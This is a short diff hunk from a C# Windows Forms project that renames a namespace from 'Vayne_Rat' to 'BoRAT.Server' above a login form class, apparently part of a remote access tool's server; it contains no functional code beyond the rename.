@@ -8,7 +8,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace Vayne_Rat
+namespace BoRAT.Server
 {
     public partial class FrmLogin : Form
     {
